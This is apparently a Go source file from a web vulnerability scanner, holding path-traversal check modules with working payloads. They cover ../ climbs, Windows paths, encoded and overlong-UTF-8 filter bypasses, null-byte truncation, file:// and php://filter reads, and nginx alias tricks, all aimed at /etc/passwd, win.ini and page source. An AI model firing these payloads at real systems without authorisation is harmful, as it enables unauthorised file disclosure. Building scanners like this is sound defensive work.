package pathtraversal

import (
	"strings"
)

// moduleMeta is the identity and severity every check module reports under.
type moduleMeta struct {
	id, name, severity string
	// decodeBase64 makes detection also look inside base64 blobs in the
	// response. Only the PHP stream-wrapper module needs it: php://filter with
	// convert.base64-encode returns the file encoded, not as plain text.
	decodeBase64 bool
	// pathOnly limits the module to path-segment injection points. The
	// nginx alias check needs the segment's own name, so it only applies there.
	pathOnly bool
}

// payload is one traversal string plus how it is built. build receives the
// file the payload should read (target for a real probe, a nonexistent name
// for the negative control) and the point being tested, and returns the value
// to place at that point. Building the control with the same function keeps
// it structurally identical to the probe, so only the final file name differs.
type payload struct {
	name   string
	target string
	build  func(file string, pt point) string
}

// module is one check family: a metadata block plus the payloads it sends.
type module struct {
	moduleMeta
	payloads []payload
}

// Canonical targets. etc/passwd is the Unix read oracle and win.ini the
// Windows one. Both are world-readable on default installs and have
// signatures that a normal page almost never contains.
const (
	unixTarget    = "etc/passwd"
	windowsTarget = "win.ini"
)

// winPath turns a forward-slash path into the backslash form Windows
// accepts, so one table can describe both separator styles.
func winPath(p string) string {
	return strings.ReplaceAll(p, "/", `\`)
}

// encodeSlash percent-encodes every forward slash in p using enc, the
// separator encoding a given bypass uses (%2f, %252f, %c0%af, ...).
func encodeSlash(p, enc string) string {
	return strings.ReplaceAll(p, "/", enc)
}

// repeatSeq repeats one traversal step n times. Depth 4 and 8 cover the
// common cases where the app adds a fixed prefix before the user value and
// where the scanner cannot know how deep the web root sits.
func repeatSeq(step string, n int) string {
	return strings.Repeat(step, n)
}

// classicModule holds plain "../" sequences. Depths 1 through 16 cover a file
// directly under the app's directory, a fixed-depth prefix, and an unknown
// depth where extra ../ steps are clamped at the filesystem root. The /proc
// entry checks the same climb against a second file.
var classicModule = module{
	moduleMeta: moduleMeta{id: "classic-traversal", name: "Path traversal: ../ sequences", severity: "high"},
	payloads: []payload{
		{name: "../ x1", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 1) + f }},
		{name: "../ x2", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 2) + f }},
		{name: "../ x4", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 4) + f }},
		{name: "../ x8", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 8) + f }},
		{name: "../ x16", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 16) + f }},
		{name: "../ x4 proc/version", target: "proc/version", build: func(f string, _ point) string { return repeatSeq("../", 4) + f }},
	},
}

// windowsModule covers Windows path handling: backslash and mixed separators,
// absolute drive paths, the 8.3 short name WINDOW~1 which slips past filters
// that look for the literal word "windows", environment-variable prefixes, and
// the other Windows files that default installs leave readable.
var windowsModule = module{
	moduleMeta: moduleMeta{id: "windows-traversal", name: "Path traversal: Windows separators and paths", severity: "high"},
	payloads: []payload{
		{name: `..\ x4`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f)
		}},
		{name: `..\ x8`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`..\`, 8) + "windows" + `\` + winPath(f)
		}},
		// Mixed separators defeat filters that only strip one separator style.
		{name: `..\/ mixed x4`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`..\/`, 4) + "windows/" + f
		}},
		{name: `..\/ mixed x8`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`..\/`, 8) + "windows/" + f
		}},
		{name: `C:\ absolute`, target: windowsTarget, build: func(f string, _ point) string {
			return `C:\windows\` + winPath(f)
		}},
		{name: `C:/ absolute`, target: windowsTarget, build: func(f string, _ point) string {
			return "C:/windows/" + f
		}},
		// 8.3 short name: the directory is WINDOW~1, not "windows", so a
		// literal-name blocklist does not match it.
		{name: `WINDOW~1 short name`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`..\`, 4) + `WINDOW~1\` + winPath(f)
		}},
		// A root-relative path with forward slashes, which an app that only
		// rejects drive letters and ".." still opens.
		{name: `/windows/ root-relative`, target: windowsTarget, build: func(f string, _ point) string {
			return "/windows/" + f
		}},
		// %SYSTEMROOT% is expanded by some Windows handlers (old ASP, CGI
		// wrappers), so this reads the same file without any "..".
		{name: `%SYSTEMROOT%\ variable`, target: windowsTarget, build: func(f string, _ point) string {
			return `%SYSTEMROOT%\` + winPath(f)
		}},
		// Four dots and a backslash: a filter that strips one "..\" leaves a
		// working "..\" behind.
		{name: `....\ x4`, target: windowsTarget, build: func(f string, _ point) string {
			return repeatSeq(`....\`, 4) + "windows" + `\` + winPath(f)
		}},
		{name: `C:\ absolute boot.ini`, target: "boot.ini", build: func(f string, _ point) string {
			return `C:\` + winPath(f)
		}},
		{name: `..\ x4 hosts file`, target: "system32/drivers/etc/hosts", build: func(f string, _ point) string {
			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f)
		}},
	},
}

// encodedModule covers encodings that get past filters which decode once,
// check for "../" literally, or only strip one occurrence of the sequence.
// Query and form values are written raw (see rawValueFor), so each payload
// reaches the app exactly as its text here, and the app's one decode turns
// it into the traversal the encoding was built for.
var encodedModule = module{
	moduleMeta: moduleMeta{id: "encoded-traversal", name: "Path traversal: encoded and filter-evading sequences", severity: "high"},
	payloads: []payload{
		{name: "%2e%2e%2f x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%2e%2e%2f", 4) + encodeSlash(f, "%2f")
		}},
		{name: "%2e%2e%2f x8", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%2e%2e%2f", 8) + encodeSlash(f, "%2f")
		}},
		// Uppercase hex: some filters match only one case.
		{name: "%2E%2E%2F x4 (uppercase)", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%2E%2E%2F", 4) + encodeSlash(f, "%2F")
		}},
		// Double-encoded: correct when the app decodes once before the
		// filter and again before the file lookup.
		{name: "%252e%252e%252f double-encoded x8", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%252e%252e%252f", 8) + encodeSlash(f, "%252f")
		}},
		// Overlong UTF-8: 0xC0 0xAE is an invalid two-byte "." and 0xC0 0xAF
		// an invalid "/". Lenient decoders (old IIS, some Java stacks) accept them.
		{name: "%c0%ae overlong UTF-8 x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%c0%ae%c0%ae%c0%af", 4) + encodeSlash(f, "%c0%af")
		}},
		{name: "%e0%80%ae overlong UTF-8 x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%e0%80%ae%e0%80%ae%e0%80%af", 4) + encodeSlash(f, "%e0%80%af")
		}},
		// Dots written as overlong UTF-8 with the slash left as a plain "/".
		{name: "..%c0%af overlong slash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%c0%af", 4) + encodeSlash(f, "%c0%af")
		}},
		// Fullwidth solidus U+FF0F, which some normalizers fold into "/".
		{name: "..%ef%bc%8f fullwidth solidus x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%ef%bc%8f", 4) + encodeSlash(f, "%ef%bc%8f")
		}},
		// Double-encoded backslash: %255c decodes to %5c, which a second
		// decode turns into "\".
		{name: "..%255c double-encoded backslash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%255c", 4) + encodeSlash(f, "%255c")
		}},
		// Encoded backslash: the app decodes %5c into a separator on Windows
		// stacks, but a filter that checks for "/" alone never sees one.
		{name: "..%5c backslash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%5c", 4) + encodeSlash(f, "%5c")
		}},
		// IIS overlong backslash: 0xC1 0x9C decodes to "\" in lenient IIS.
		{name: "..%c1%9c overlong backslash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%c1%9c", 4) + encodeSlash(f, "%c1%9c")
		}},
		// Only the slash encoded, dots literal: catches filters that look at
		// encoded dots alone.
		{name: "..%2f slash-only encoded x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%2f", 4) + f
		}},
		// Double-encoded slash with literal dots: a filter that decodes once
		// sees "..%2f", which is not a traversal until the second decode.
		{name: "..%252f double-encoded slash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%252f", 4) + encodeSlash(f, "%252f")
		}},
		// Encoded dots and a backslash, for stacks that decode dots only.
		{name: "%2e%2e%5c encoded dots and backslash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%2e%2e%5c", 4) + encodeSlash(f, "%5c")
		}},
		// IIS unicode escapes: %uff0e is a fullwidth ".", %u2215 a division
		// slash, and %u2216 a set minus, which some IIS builds read as "\".
		// These are not valid percent escapes, so they are sent raw (see newRequest).
		{name: "%uff0e%uff0e%u2215 IIS unicode x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%uff0e%uff0e%u2215", 4) + encodeSlash(f, "%u2215")
		}},
		{name: "..%u2215 IIS unicode slash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..%u2215", 4) + encodeSlash(f, "%u2215")
		}},
		{name: "%uff0e%uff0e%u2216 IIS unicode backslash x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("%uff0e%uff0e%u2216", 4) + encodeSlash(f, "%u2216")
		}},
		// Non-recursive filter bypass: a single stripping pass turns "....//"
		// into "../".
		{name: "....// strip bypass x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("....//", 4) + f
		}},
		// Tomcat and Java servers read "..;/" as "../" because they drop the
		// ;-delimited path parameter. nginx passes it through untouched, so
		// the mismatch can expose files or servlets behind a proxy.
		{name: "..;/ matrix-parameter x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("..;/", 4) + f
		}},
		// A dot segment with an encoded dot, e.g. ".%2e/".
		{name: ".%2e/ partial encoding x4", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq(".%2e/", 4) + f
		}},
		// Null-byte truncation: an app that appends ".pdf" or ".png" gets the
		// file name cut at the NUL by C-based file APIs (old PHP, some CGI).
		{name: "%00.png null-byte suffix", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("../", 8) + f + "%00.png"
		}},
		{name: "%00.pdf null-byte suffix", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("../", 8) + f + "%00.pdf"
		}},
		// The same truncation with nothing after the NUL, for apps that
		// append a fixed extension themselves.
		{name: "%00 bare null byte x8", target: unixTarget, build: func(f string, _ point) string {
			return repeatSeq("../", 8) + f + "%00"
		}},
	},
}

// absoluteModule sends an absolute path or URL in place of a relative one.
// Apps often block ".." but still open whatever absolute path they are given.
var absoluteModule = module{
	moduleMeta: moduleMeta{id: "absolute-path", name: "Path traversal: absolute path accepted", severity: "high"},
	payloads: []payload{
		{name: "/etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "/" + f }},
		{name: "//etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "//" + f }},
		{name: "file:///etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file:///" + f }},
		{name: "file://localhost/etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file://localhost/" + f }},
		// A single slash after "file:", which some URL parsers accept.
		{name: "file:/etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file:/" + f }},
		{name: "file:///C:/windows/win.ini", target: windowsTarget, build: func(f string, _ point) string { return "file:///C:/windows/" + f }},
	},
}

// phpWrapperModule reads files through PHP's php://filter stream. The file
// comes back base64-encoded, so detection decodes it (see decodeBase64).
// That sidesteps a response filter that would block plain-text file content.
var phpWrapperModule = module{
	moduleMeta: moduleMeta{id: "php-filter-wrapper", name: "Path traversal: PHP stream wrapper (base64 read)", severity: "high", decodeBase64: true},
	payloads: []payload{
		{name: "php://filter base64 ../ x8", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/convert.base64-encode/resource=" + repeatSeq("../", 8) + f
		}},
		{name: "php://filter read= base64 ../ x8", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/read=convert.base64-encode/resource=" + repeatSeq("../", 8) + f
		}},
		{name: "php://filter base64 absolute", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/convert.base64-encode/resource=/" + f
		}},
		{name: "php://filter read= base64 absolute", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/read=convert.base64-encode/resource=/" + f
		}},
		{name: "php://filter base64 %2e%2e%2f x4", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/convert.base64-encode/resource=" + repeatSeq("%2e%2e%2f", 4) + encodeSlash(f, "%2f")
		}},
		// "....//" collapses to "../" in one non-recursive strip.
		{name: "php://filter base64 ....// x4", target: unixTarget, build: func(f string, _ point) string {
			return "php://filter/convert.base64-encode/resource=" + repeatSeq("....//", 4) + f
		}},
		// No traversal at all: the app's own source file, read as base64. This
		// finds the PHP source of the page under test.
		{name: "php://filter base64 index.php source", target: "index.php", build: func(f string, _ point) string {
			return "php://filter/convert.base64-encode/resource=" + f
		}},
	},
}

// aliasModule targets nginx "alias" misconfiguration. With
// "location /static { alias /srv/static/; }" a request for "/static../x"
// maps to "/srv/static/../x", which leaves the aliased directory. Only
// path-segment points can carry this, because the payload has to include the
// segment's own name.
var aliasModule = module{
	moduleMeta: moduleMeta{id: "nginx-alias", name: "Path traversal: alias off-by-slash (path segment)", severity: "high", pathOnly: true},
	payloads: []payload{
		{name: "segment.. (nginx alias)", target: unixTarget, build: func(f string, pt point) string {
			return pt.segment + "../" + f
		}},
		{name: "segment..%2f (encoded alias)", target: unixTarget, build: func(f string, pt point) string {
			return pt.segment + "..%2f" + encodeSlash(f, "%2f")
		}},
	},
}

// modules is the full battery, in the order a run reports them. The
// per-point loop stops at the first confirmed read, so later payloads in a
// module are skipped on points already known to be vulnerable.
var modules = []module{classicModule, windowsModule, encodedModule, absoluteModule, phpWrapperModule, aliasModule}

// negativeControlName is what the control request asks for. It contains no
// separators and does not exist on any normal server, so a response that
// still shows a file signature means the page itself always contains it,
// not that the traversal worked.
const negativeControlName = "aperture-no-such-file-61d0"
